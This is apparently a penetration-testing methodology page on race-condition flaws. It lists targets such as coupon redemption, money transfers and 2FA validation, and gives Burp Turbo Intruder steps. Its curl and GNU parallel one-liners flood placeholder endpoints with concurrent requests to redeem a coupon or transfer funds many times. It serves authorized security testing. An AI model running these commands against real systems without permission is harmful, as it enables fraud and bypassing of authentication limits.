---
title: "Race Conditions"
---

## What It Is

Race conditions happen when a server processes multiple concurrent requests and the timing between check and use of a resource creates exploitable windows. These are underreported and often high-severity.

## Where to Look

- Coupon / promo code redemption
- Money transfers / balance operations
- Voting / rating systems
- Invitation / referral rewards
- Follow / unfollow (follower count manipulation)
- File upload + processing
- Two-factor authentication code validation
- One-time-use tokens (password reset, email verification)

## Testing with Burp

```
# Turbo Intruder — send same request many times concurrently
# In Burp: Extensions → Turbo Intruder

# Use the race.py template:
# 1. Send request to Turbo Intruder
# 2. Use "race.py" script
# 3. Set concurrent request count (e.g., 20-50)
# 4. Fire and check results
```

## Testing with CLI

```bash
# GNU Parallel — send N requests at once
seq 1 50 | parallel -j 50 "curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST https://<TARGET>/redeem-coupon \
  -H 'Cookie: session=<COOKIE>' \
  -d 'code=DISCOUNT50'"

# Check if coupon was applied multiple times

# Using curl with background processes
for i in $(seq 1 20); do
  curl -s -X POST https://<TARGET>/transfer \
    -H 'Cookie: session=<COOKIE>' \
    -d 'amount=100&to=attacker' &
done
wait
```

## Common Race Condition Bugs

| Scenario | Check |
|----------|-------|
| Coupon applied twice | Apply same coupon 50x concurrently |
| Double withdrawal | Send transfer request 50x concurrently |
| Bypass rate limit on 2FA | Send OTP validation requests concurrently |
| Multiple sign-up bonuses | Register same account concurrently |
| Exceed purchase limit | Buy same item concurrently |

## Findings

| Endpoint | Action | Result | Impact | Status |
|----------|--------|--------|--------|--------|
| | | | | |
